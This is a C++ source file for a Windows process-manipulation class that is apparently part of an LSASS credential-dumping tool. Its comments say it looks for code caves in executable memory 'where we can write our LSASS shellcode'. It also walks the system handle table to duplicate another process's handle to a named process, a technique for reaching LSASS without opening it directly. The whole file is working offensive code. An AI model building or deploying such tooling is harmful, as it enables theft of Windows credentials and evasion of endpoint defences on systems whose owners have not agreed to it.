#include "process.hpp"

using namespace process;

// Returns true if the address is inside a module
auto remote_process::is_address_in_module(std::intptr_t address) -> bool {
	auto modules = enum_modules(this);

	auto res = std::find_if(modules.begin(), modules.end(), [&](enum_modules::iterator::value_type entry) {
		return address >= reinterpret_cast<std::intptr_t>(entry.modBaseAddr) && address <= reinterpret_cast<std::intptr_t>(entry.modBaseAddr + entry.modBaseSize);
	});

	return res != modules.end();
}

// Attempts to find targetable regions where we can write our LSASS shellcode
auto remote_process::find_targetable_regions() -> std::vector<utils::TARGETABLE_REGION> {
	std::vector<utils::TARGETABLE_REGION> result;	
	std::vector<MEMORY_BASIC_INFORMATION> info;

	// Open handle to target process
	open(PROCESS_ALL_ACCESS);

	std::uintptr_t           address = 0;
	std::size_t              length  = sizeof MEMORY_BASIC_INFORMATION;
	NTSTATUS				 res     = 0;
	MEMORY_BASIC_INFORMATION minfo   = {0};

	// last address, because we're lazy
	std::uintptr_t			 last_address = 0;

	// populate temporary info buffer
	for (address = 0; res = NtQueryVirtualMemory(handle(), reinterpret_cast<PVOID>(address), MemoryBasicInformation, &minfo, sizeof minfo, &length) >= 0; address += minfo.RegionSize)	{
		
		// easy way to find out if we reached the end
		if (last_address != 0 && last_address == reinterpret_cast<std::uintptr_t>(minfo.BaseAddress))
			break;

		last_address = reinterpret_cast<std::uintptr_t>(minfo.BaseAddress);
		info.push_back(minfo);
	}

	// remove all non-targetable regions (non-executable)
	info.erase(std::remove_if(info.begin(), info.end(), [&](MEMORY_BASIC_INFORMATION minfo) { 
		return !(minfo.Protect == PAGE_EXECUTE || minfo.Protect == PAGE_EXECUTE_READ || minfo.Protect == PAGE_EXECUTE_READWRITE || minfo.Protect == PAGE_EXECUTE_WRITECOPY);
	}), info.end());

	if (info.empty())
		return result;

	std::for_each(info.begin(), info.end(), [&](MEMORY_BASIC_INFORMATION info) {
		auto buff = VirtualAlloc(nullptr, info.RegionSize, MEM_COMMIT, PAGE_READWRITE);

		// check if we are allowed to iterate
		if (buff == nullptr)
			return;

		// copy
		NtReadVirtualMemory(handle(), info.BaseAddress, buff, info.RegionSize, 0);

		// easy access
		auto buffer      = reinterpret_cast<std::int8_t*>(buff);
		// indexing
		auto index       = info.RegionSize - 1;
		// size
		std::size_t size = 0;

		while (buffer[index] == 0)
		{
			index--;
			size++;
		}

		utils::TARGETABLE_REGION region {};
		region.info = info;
		region.size = size;
		region.base = reinterpret_cast<std::uintptr_t>(info.BaseAddress) + index;

		result.push_back(region);
	});

	close();

	return result;
}

// Attempts to "steal" handle, we aren't really stealing, but just get
// the handle to process with name {name}
auto remote_process::retrieve_handle_to(std::string name, std::size_t owner) -> void* {
	if (name.empty())
		return nullptr;

	if (!owner)
		owner = pid();

	std::intptr_t buffer = 0;
	std::size_t   size   = 0;

	while (true) {
		auto status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(16), reinterpret_cast<PVOID>(buffer), size, reinterpret_cast<PULONG>(&size));

		if (!NT_SUCCESS(status))
		{
			if (status == STATUS_INFO_LENGTH_MISMATCH)
			{
				if (buffer != 0)
					VirtualFree(reinterpret_cast<LPVOID>(buffer), 0, MEM_RELEASE);

				buffer = reinterpret_cast<std::intptr_t>(VirtualAlloc(nullptr, size, MEM_COMMIT, PAGE_READWRITE));
			}
		}
		else {
			break;
		}
	}

	//Our buffer has now been filled with a SYSTEM_HANDLE_INFORMATION struct
	auto handle_info = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(buffer);

	// Define outside of loop so that we may free them after lol
	std::intptr_t   object_buffer = 0;
	std::size_t     object_size = 0;

	for (auto i = 0; i < handle_info->HandleCount; ++i)
	{
		// Retrieve the handle
		auto remote_handle = reinterpret_cast<PSYSTEM_HANDLE_TABLE_ENTRY_INFO>(&handle_info->Handles[i]);

		// Sanity checks
		if (!remote_handle)
			continue;
		if (!remote_handle->HandleValue)
			continue;
		if (remote_handle->UniqueProcessId != owner) {
			continue;
		}

		// Try to duplicate the handle
		open(PROCESS_DUP_HANDLE);

		// ...
		auto local = reinterpret_cast<HANDLE>(remote_handle->HandleValue);
		auto dup_status = NtDuplicateObject(handle(), HANDLE(remote_handle->HandleValue), GetCurrentProcess(), &local, PROCESS_QUERY_LIMITED_INFORMATION, false, 0);

		// close temporary handle
		close();

		if (!NT_SUCCESS(dup_status))
			continue; // Failed to duplicate sadge

		std::size_t num_attempts  = 0;

		while (true) {

			if (num_attempts == 20)
				break;

			++num_attempts;

			// Query object info
			auto query_object_status = NtQueryObject(local, ObjectTypeInformation, reinterpret_cast<PVOID>(object_buffer), object_size, reinterpret_cast<PULONG>(&object_size));

			// Speaks for itself
			if (!NT_SUCCESS(query_object_status)) {
				if (object_buffer != 0)
					VirtualFree(reinterpret_cast<LPVOID>(object_buffer), 0, MEM_RELEASE); // free old page

				object_buffer = reinterpret_cast<std::intptr_t>(VirtualAlloc(nullptr, object_size, MEM_COMMIT, PAGE_READWRITE)); // allocate new one
			}
			else {
				if (object_buffer == 0)
					break;

				if (wcsncmp(reinterpret_cast<POBJECT_TYPE_INFORMATION>(object_buffer)->TypeName.Buffer, L"Process", reinterpret_cast<POBJECT_TYPE_INFORMATION>(object_buffer)->TypeName.Length + 1) == 0) {
					wchar_t process[MAX_PATH];
					if (GetModuleFileNameExW(local, nullptr, process, MAX_PATH)) {

						// Input 
						std::wstring wide_process_name = std::wstring(name.begin(), name.end());

						// Read value
						std::wstring wide_process      = std::wstring(process);

						// Fix so we can compare
						auto position = wide_process.find_last_of(L"\\");

						wide_process = wide_process.substr(position + 1, wide_process.length());

						// Transform them to lower
						std::transform(wide_process_name.begin(), wide_process_name.end(), wide_process_name.begin(), std::tolower);
						std::transform(wide_process.begin(), wide_process.end(), wide_process.begin(), std::tolower);

						// Compare
						if (wcsstr(wide_process.c_str(), wide_process_name.c_str()) != nullptr) {
							HANDLE handle_found = reinterpret_cast<HANDLE>(remote_handle->HandleValue);

							// free the buffers
							VirtualFree(reinterpret_cast<LPVOID>(buffer), 0, MEM_RELEASE);
							VirtualFree(reinterpret_cast<LPVOID>(object_buffer), 0, MEM_RELEASE);

							// close owner to the remote process
							close();

							// return the handle
							return handle_found;
						}
						else {
							break;
						}
					}
				}
				else {
					break;
				}
			}
		}

		close();
		continue;
	}

	// free the buffers
	if(buffer != 0)
	VirtualFree(reinterpret_cast<LPVOID>(buffer), 0, MEM_RELEASE);

	if(object_buffer != 0)
	VirtualFree(reinterpret_cast<LPVOID>(object_buffer), 0, MEM_RELEASE);

	// return invalid handle
	return INVALID_HANDLE_VALUE;
}

auto remote_process::open(std::size_t rights) -> bool {
	// if we have a handle already, and we have the requested rights already
	if (_handle && _rights == rights) {
		std::cout << "returned because we alreayd have handle" << std::endl;
		return true; // just keep the current handle
	}

	// else check if we already have a handle, if so, close it
	if (_handle)
		CloseHandle(_handle);

	// open a new handle
	_handle = OpenProcess(rights, false, _pid);

	// set new rights value
	if (_handle) _rights = rights; else _rights = 0;

	// return val
	return _handle ? true : false;
}

auto remote_process::close() -> void {
	if (_handle)
		CloseHandle(_handle);

	// reset
	_handle = nullptr;
	_rights = 0;
}

remote_process::remote_process(std::string name) : _name(name), _handle(nullptr) {

	auto processes = enum_processes();

	auto entry = std::find_if(processes.begin(), processes.end(), [&](PROCESSENTRY32 entry) -> bool {
		return std::strstr(entry.szExeFile, name.c_str()) != nullptr;
	});

	if (entry == processes.end()) {
		__fastfail(0);
	}

	_pid = entry->th32ProcessID;

}